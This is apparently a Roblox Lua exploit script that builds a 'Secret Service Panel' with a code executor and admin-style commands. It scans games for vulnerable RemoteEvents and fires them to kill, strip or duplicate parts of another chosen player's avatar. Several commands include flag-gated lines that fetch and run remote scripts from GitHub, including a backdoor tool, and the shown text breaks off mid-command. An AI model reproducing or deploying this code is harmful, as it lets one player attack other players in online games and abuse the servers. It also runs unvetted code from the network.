local SecrectServicePanelFoldr = Instance.new("Folder",game:GetService("ReplicatedStorage"))
SecrectServicePanelFoldr.Name = "SecrectServicePanel"
local Player = Instance.new("StringValue",game:GetService("ReplicatedStorage"):WaitForChild("SecrectServicePanel"))
Player.Name = "Player"
Player.Value = game:GetService("Players").LocalPlayer.Name

removething = function(name,parent) for i,v in pairs(parent:GetChildren()) do if v.Name == name then v:Destroy() end end end
removething("S3crectS4viceP1nel",game:GetService("CoreGui"))

local S3crectS4viceP1nel = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Packages = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local zoom_out = Instance.new("ImageButton")
local UIGridLayout = Instance.new("UIGridLayout")
local Example = Instance.new("TextButton")
local more_vert = Instance.new("ImageButton")
local NameLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local close = Instance.new("ImageButton")
local remove = Instance.new("ImageButton")
local Frame_2 = Instance.new("Frame")
local arrow_drop_up = Instance.new("ImageButton")
local arrow_drop_up_2 = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local navigate_next = Instance.new("ImageButton")
local AdminPanel = Instance.new("Frame")
local AdminFrame = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local ExampleCMD = Instance.new("TextButton")
local PlayersFrame = Instance.new("Frame")
local ScrollingFrame_3 = Instance.new("ScrollingFrame")
local UIGridLayout_3 = Instance.new("UIGridLayout")
local ExamplePlrs = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local refresh = Instance.new("ImageButton")
local Executor = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextBox_2 = Instance.new("TextBox")
local Frame_3 = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Frame_4 = Instance.new("Frame")
local packages = Instance.new("TextButton")

--Properties:

S3crectS4viceP1nel.Name = "S3crectS4viceP1nel"
S3crectS4viceP1nel.Parent = game:GetService("CoreGui")
S3crectS4viceP1nel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
S3crectS4viceP1nel.ResetOnSpawn = false

Frame.Parent = S3crectS4viceP1nel
Frame.BackgroundColor3 = Color3.fromRGB(59, 58, 59)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.628370464, 0, 0.529925168, 0)
Frame.Size = UDim2.new(0, 442, 0, 265)

Packages.Name = "Packages"
Packages.Parent = Frame
Packages.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Packages.BorderSizePixel = 0
Packages.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
Packages.Size = UDim2.new(0, 334, 0, 197)
Packages.Visible = false

ScrollingFrame.Parent = Packages
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 37, 38)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0269461069, 0, -3.09823122e-07, 0)
ScrollingFrame.Size = UDim2.new(0, 338, 0, 195)
ScrollingFrame.ScrollBarThickness = 0

TextBox.Parent = ScrollingFrame
TextBox.BackgroundColor3 = Color3.fromRGB(47, 46, 49)
TextBox.BorderSizePixel = 0
TextBox.LayoutOrder = -999
TextBox.Position = UDim2.new(-0.195084736, 0, -1.28571427, 0)
TextBox.Size = UDim2.new(0, 324, 0, 18)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "Search"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(178, 178, 178)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left

zoom_out.Name = "zoom_out"
zoom_out.Parent = TextBox
zoom_out.BackgroundTransparency = 1.000
zoom_out.LayoutOrder = 7
zoom_out.Position = UDim2.new(0.897297323, 0, 0.191768795, 0)
zoom_out.Size = UDim2.new(0, 16, 0, 17)
zoom_out.ZIndex = 2
zoom_out.Image = "rbxassetid://3926307971"
zoom_out.ImageColor3 = Color3.fromRGB(178, 178, 178)
zoom_out.ImageRectOffset = Vector2.new(284, 164)
zoom_out.ImageRectSize = Vector2.new(36, 36)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0, 338, 0, 25)

Example.Name = "Example"
Example.Parent = SecrectServicePanelFoldr
Example.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
Example.BorderSizePixel = 0
Example.Position = UDim2.new(0.00834664889, 0, 0.139153346, 0)
Example.Size = UDim2.new(0, 338, 0, 25)
Example.Font = Enum.Font.SourceSans
Example.Text = "Example"
Example.TextColor3 = Color3.fromRGB(255, 255, 255)
Example.TextSize = 13.000
Example.TextXAlignment = Enum.TextXAlignment.Left

more_vert.Name = "more_vert"
more_vert.Parent = Example
more_vert.BackgroundTransparency = 1.000
more_vert.LayoutOrder = 9
more_vert.Position = UDim2.new(0.917309701, 0, 0.128279269, 0)
more_vert.Size = UDim2.new(0, 16, 0, 17)
more_vert.ZIndex = 2
more_vert.Image = "rbxassetid://3926305904"
more_vert.ImageRectOffset = Vector2.new(764, 764)
more_vert.ImageRectSize = Vector2.new(36, 36)

NameLabel.Name = "NameLabel"
NameLabel.Parent = Frame
NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.BackgroundTransparency = 1.000
NameLabel.Size = UDim2.new(0, 121, 0, 15)
NameLabel.Font = Enum.Font.SourceSans
NameLabel.Text = " Secret Serivce Panel"
NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.TextSize = 14.000
NameLabel.TextWrapped = true
NameLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.002358553, 0, 0.0630111992, 0)
TextButton.Size = UDim2.new(0, 213, 0, 22)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Executor"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.955525577, 0, -0.00276563875, 0)
close.Size = UDim2.new(0, 16, 0, 17)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)

remove.Name = "remove"
remove.Parent = Frame
remove.BackgroundTransparency = 1.000
remove.LayoutOrder = 6
remove.Position = UDim2.new(0.912398934, 0, -0.00218338333, 0)
remove.Size = UDim2.new(0, 16, 0, 17)
remove.ZIndex = 2
remove.Image = "rbxassetid://3926307971"
remove.ImageRectOffset = Vector2.new(884, 284)
remove.ImageRectSize = Vector2.new(36, 36)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(48, 46, 49)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.961906016, 0, 0.148312107, 0)
Frame_2.Size = UDim2.new(0, 16, 0, 196)

arrow_drop_up.Name = "arrow_drop_up"
arrow_drop_up.Parent = Frame_2
arrow_drop_up.BackgroundTransparency = 1.000
arrow_drop_up.LayoutOrder = 8
arrow_drop_up.Position = UDim2.new(0, 0, 0.00291936332, 0)
arrow_drop_up.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up.ZIndex = 2
arrow_drop_up.Image = "rbxassetid://3926307971"
arrow_drop_up.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up.ImageRectSize = Vector2.new(36, 36)

arrow_drop_up_2.Name = "arrow_drop_up"
arrow_drop_up_2.Parent = Frame_2
arrow_drop_up_2.BackgroundTransparency = 1.000
arrow_drop_up_2.LayoutOrder = 8
arrow_drop_up_2.Position = UDim2.new(0, 0, 0.918412328, 0)
arrow_drop_up_2.Rotation = 180.000
arrow_drop_up_2.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up_2.ZIndex = 2
arrow_drop_up_2.Image = "rbxassetid://3926307971"
arrow_drop_up_2.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up_2.ImageRectSize = Vector2.new(36, 36)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(56, 55, 58)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0520361997, 0, 0.905660391, 0)
TextLabel.Size = UDim2.new(0, 415, 0, 18)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.LineHeight = 1.170
TextLabel.Text = "Click or press ; to enter a command."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 13.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

navigate_next.Name = "navigate_next"
navigate_next.Parent = TextLabel
navigate_next.BackgroundTransparency = 1.000
navigate_next.LayoutOrder = 13
navigate_next.Position = UDim2.new(-0.0570844896, 0, 0.0119052464, 0)
navigate_next.Size = UDim2.new(0, 24, 0, 17)
navigate_next.ZIndex = 2
navigate_next.Image = "rbxassetid://3926305904"
navigate_next.ImageRectOffset = Vector2.new(444, 844)
navigate_next.ImageRectSize = Vector2.new(36, 36)

AdminPanel.Name = "AdminPanel"
AdminPanel.Parent = Frame
AdminPanel.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
AdminPanel.BorderSizePixel = 0
AdminPanel.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
AdminPanel.Size = UDim2.new(0, 334, 0, 197)
AdminPanel.Visible = false

AdminFrame.Name = "AdminFrame"
AdminFrame.Parent = AdminPanel
AdminFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AdminFrame.BackgroundTransparency = 1.000
AdminFrame.Position = UDim2.new(0.0179640725, 0, 0.0507614203, 0)
AdminFrame.Size = UDim2.new(0, 209, 0, 184)

ScrollingFrame_2.Parent = AdminFrame
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 208, 0, 184)
ScrollingFrame_2.BottomImage = ""
ScrollingFrame_2.MidImage = ""
ScrollingFrame_2.TopImage = ""

UIGridLayout_2.Parent = ScrollingFrame_2
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 100, 0, 30)
UIGridLayout_2.StartCorner = Enum.StartCorner.BottomLeft

ExampleCMD.Name = "ExampleCMD"
ExampleCMD.Parent = SecrectServicePanelFoldr
ExampleCMD.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
ExampleCMD.BorderSizePixel = 0
ExampleCMD.Position = UDim2.new(0.00834664889, 0, 0.0630109012, 0)
ExampleCMD.Size = UDim2.new(0, 82, 0, 26)
ExampleCMD.Font = Enum.Font.SourceSans
ExampleCMD.Text = "Example"
ExampleCMD.TextColor3 = Color3.fromRGB(255, 255, 255)
ExampleCMD.TextSize = 13.000
ExampleCMD.TextXAlignment = Enum.TextXAlignment.Left

PlayersFrame.Name = "PlayersFrame"
PlayersFrame.Parent = AdminPanel
PlayersFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayersFrame.BackgroundTransparency = 1.000
PlayersFrame.Position = UDim2.new(0.646706581, 0, 0.0558375642, 0)
PlayersFrame.Size = UDim2.new(0, 112, 0, 184)

ScrollingFrame_3.Parent = PlayersFrame
ScrollingFrame_3.Active = true
ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_3.BackgroundTransparency = 1.000
ScrollingFrame_3.BorderColor3 = Color3.fromRGB(36, 35, 36)
ScrollingFrame_3.BorderSizePixel = 2
ScrollingFrame_3.Size = UDim2.new(0, 113, 0, 184)
ScrollingFrame_3.BottomImage = ""
ScrollingFrame_3.CanvasSize = UDim2.new(0, 0, 15, 0)
ScrollingFrame_3.ScrollBarThickness = 1
ScrollingFrame_3.TopImage = ""

UIGridLayout_3.Parent = ScrollingFrame_3
UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_3.CellSize = UDim2.new(0, 120, 0, 30)
UIGridLayout_3.StartCorner = Enum.StartCorner.BottomLeft

ExamplePlrs.Name = "ExamplePlrs"
ExamplePlrs.Parent = ScrollingFrame_3
ExamplePlrs.BackgroundColor3 = Color3.fromRGB(66, 64, 66)
ExamplePlrs.BackgroundTransparency = 0.700
ExamplePlrs.BorderSizePixel = 0
ExamplePlrs.Size = UDim2.new(0, 200, 0, 50)
ExamplePlrs.Visible = false
ExamplePlrs.Font = Enum.Font.SourceSans
ExamplePlrs.Text = "pipeman"
ExamplePlrs.TextColor3 = Color3.fromRGB(255, 255, 255)
ExamplePlrs.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.47963801, 0, 0.0641509444, 0)
TextButton_2.Size = UDim2.new(0, 206, 0, 22)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Admin Panel"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 14.000

refresh.Name = "refresh"
refresh.Parent = Frame
refresh.BackgroundTransparency = 1.000
refresh.Position = UDim2.new(0.959718883, 0, 0.0717624426, 0)
refresh.Size = UDim2.new(0, 16, 0, 17)
refresh.ZIndex = 2
refresh.Image = "rbxassetid://3926307971"
refresh.ImageRectOffset = Vector2.new(404, 84)
refresh.ImageRectSize = Vector2.new(36, 36)

Executor.Name = "Executor"
Executor.Parent = Frame
Executor.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0.206224695, 0, 0.153291643, 0)
Executor.Size = UDim2.new(0, 334, 0, 195)
Executor.ZIndex = 20

TextButton_3.Parent = Executor
TextButton_3.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.00342089264, 0, 0.8696419, 0)
TextButton_3.Size = UDim2.new(0, 168, 0, 23)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Execute"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 14.000

TextButton_4.Parent = Executor
TextButton_4.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.503420889, 0, 0.869642198, 0)
TextButton_4.Size = UDim2.new(0, 157, 0, 23)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Clear"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 14.000

TextBox_2.Parent = Executor
TextBox_2.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
TextBox_2.BorderSizePixel = 0
TextBox_2.Position = UDim2.new(0.00299401209, 0, -0.00507614203, 0)
TextBox_2.Size = UDim2.new(0, 324, 0, 170)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.MultiLine = true
TextBox_2.ClearTextOnFocus = false
TextBox_2.Text = ""
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextSize = 14.000
TextBox_2.TextXAlignment = Enum.TextXAlignment.Left
TextBox_2.TextYAlignment = Enum.TextYAlignment.Top

Frame_3.Parent = Executor
Frame_3.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
Frame_3.BorderSizePixel = 0
Frame_3.Size = UDim2.new(0, 14, 0, 171)
Frame_3.Visible = false

UIListLayout.Parent = Frame_3
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Frame_4.Parent = Frame
Frame_4.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(-0.000358005753, 0, 0.152203158, 0)
Frame_4.Size = UDim2.new(0, 92, 0, 197)

packages.Name = "packages"
packages.Parent = Frame
packages.BackgroundColor3 = Color3.fromRGB(70, 69, 70)
packages.BorderSizePixel = 0
packages.Position = UDim2.new(0.00517658424, 0, 0.178197145, 0)
packages.Size = UDim2.new(0, 88,0, 28)
packages.Font = Enum.Font.SourceSans
packages.Text = "Packages"
packages.TextColor3 = Color3.fromRGB(255, 255, 255)
packages.TextSize = 18.000
packages.TextWrapped = true

-- Scripts:

local function KNZX_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)

	local searchBar = script.Parent
	local scrolllFrame = script.Parent.Parent

	function updateSearch()
		for i,button in pairs(scrolllFrame:GetChildren()) do
			if button:IsA("TextButton") then
				local searchText = string.lower(searchBar.Text)
				if searchText ~= "" then
					local buttonText = string.lower(button.Text)
					if string.find(buttonText, searchText) then
						button.Visible = true			
					else
						button.Visible = false
					end
				else
					button.Visible = true
				end
			end
		end
	end

	searchBar:GetPropertyChangedSignal("Text"):Connect(updateSearch)
end
coroutine.wrap(KNZX_fake_script)()
local function SGMWI_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = true
	end)
end
coroutine.wrap(SGMWI_fake_script)()
local function SXSMBHB_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(SXSMBHB_fake_script)()
local function AQRU_fake_script() -- remove.LocalScript 
	local script = Instance.new('LocalScript', remove)

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.refresh.Visible == true then
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 16)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = false
					end
				end
			end
		else
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 265)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = true
					end 
				end
			end
		end
	end)
end
coroutine.wrap(AQRU_fake_script)()
local function ZOMFSSU_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0.50
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(ZOMFSSU_fake_script)()
local function FLYT_fake_script() -- ExampleCMD.LocalScript 
	local script = Instance.new('LocalScript', ExampleCMD)

	script.Parent.MouseButton1Click:Connect(function()
		--size changer
	end)
end
coroutine.wrap(FLYT_fake_script)()
local function GKOVJ_fake_script() -- ScrollingFrame_3.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame_3)

	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			--local NewPlayer = Instance.new("TextButton",script.Parent)
			--NewPlayer.Active = true
			--NewPlayer.AutoButtonColor = true
			--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
			--NewPlayer.BackgroundTransparency = 0.7
			--NewPlayer.BorderSizePixel = 0
			--NewPlayer.Name = v.Name
			--NewPlayer.Visible = true
			--NewPlayer.Text = v.Name
			--NewPlayer.TextColor3 = Color3.new(255,255,255)
			--NewPlayer.TextScaled = true
			--NewPlayer.TextWrapped = true
			local NewPlayer = script.Parent.ExamplePlrs:Clone()
			NewPlayer.Name = v.Name
			NewPlayer.Text = v.Name
			NewPlayer.Parent = script.Parent
			NewPlayer.Visible = true
			NewPlayer.MouseButton1Click:Connect(function()
				Player.Value = NewPlayer.Text
			end)
		end
	end
end
coroutine.wrap(GKOVJ_fake_script)()
local function EHNJJIG_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = true
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(EHNJJIG_fake_script)()
local function QRUYCIJ_fake_script() -- refresh.LocalScript 
	local script = Instance.new('LocalScript', refresh)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(script.Parent.Parent.AdminPanel.PlayersFrame:GetChildren()) do
			if v:IsA("TextButton") then
				if v.Name == "ExamplePlrs" then
					-- none
				else
					v:Destroy()
				end
			end
		end

		for i,v in pairs(game:GetService("Players"):GetChildren()) do
			if v:IsA("Player") then
				--local NewPlayer = Instance.new("TextButton",script.Parent)
				--NewPlayer.Active = true
				--NewPlayer.AutoButtonColor = true
				--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
				--NewPlayer.BackgroundTransparency = 0.7
				--NewPlayer.BorderSizePixel = 0
				--NewPlayer.Name = v.Name
				--NewPlayer.Visible = true
				--NewPlayer.Text = v.Name
				--NewPlayer.TextColor3 = Color3.new(255,255,255)
				--NewPlayer.TextScaled = true
				--NewPlayer.TextWrapped = true
				local NewPlayer = ExamplePlrs:Clone()
				NewPlayer.Name = v.Name
				NewPlayer.Text = v.Name
				NewPlayer.Parent = PlayersFrame.ScrollingFrame
				NewPlayer.Visible = true
				NewPlayer.MouseButton1Click:Connect(function()
					Player.Value = NewPlayer.Text
				end)
			end
		end
	end)
end
coroutine.wrap(QRUYCIJ_fake_script)()
local function SHGQSS_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(script.Parent.Parent.TextBox.Text)()
	end)
end
coroutine.wrap(SHGQSS_fake_script)()
local function LOFLOFC_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = " "
	end)
end
coroutine.wrap(LOFLOFC_fake_script)()
local function VQHBXP_fake_script() -- TextBox_2.LocalScript 
	local script = Instance.new('LocalScript', TextBox_2)

	--local t1, count = script.Parent.Text:gsub("\n", "")

	--for i = 0, count, 1 do
	--	local CurrentLine = Instance.new("TextBox",script.Parent.Parent.Frame)
	--	CurrentLine.BackgroundTransparency = 1
	--	CurrentLine.BorderSizePixel = 0
	--	CurrentLine.LayoutOrder = 0
	--	CurrentLine.Name = count
	--	CurrentLine.Size = UDim2.new(0, 16, 0, 12)
	--	CurrentLine.ZIndex = 100
	--	CurrentLine.TextColor3 = Color3.new(255,255,255)
	--	CurrentLine.TextScaled = true
	--	CurrentLine.TextWrapped = true
	--	CurrentLine.Text = count
	--	wait(1)
	--end
end
coroutine.wrap(VQHBXP_fake_script)()
local function IRDU_fake_script() -- packages.LocalScript 
	local script = Instance.new('LocalScript', packages)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = true
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(IRDU_fake_script)()
local function CreateCMD(name,callback)
	local NewCMD = ExampleCMD:Clone()
	NewCMD.Name = name
	NewCMD.Text = name
	NewCMD.Parent = ScrollingFrame_2
	NewCMD.MouseButton1Click:Connect(callback)
end
local function CreateScript(name,callback)
	local NewPackage = Example:Clone()
	NewPackage.Name = name
	NewPackage.Text = name
	NewPackage.Parent = ScrollingFrame
	NewPackage.MouseButton1Click:Connect(callback)
end

CreateCMD("kill",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
    ]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = false

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end

	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Head, game.JointsService)
	end
end)

CreateCMD("naked",function()
	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Shirt, game.JointsService)
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Pants, game.JointsService)
	end
end)

CreateCMD("dupe head",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end
end)

CreateCMD("dupe torso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
		end
	end
end)

CreateCMD("bombhead",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
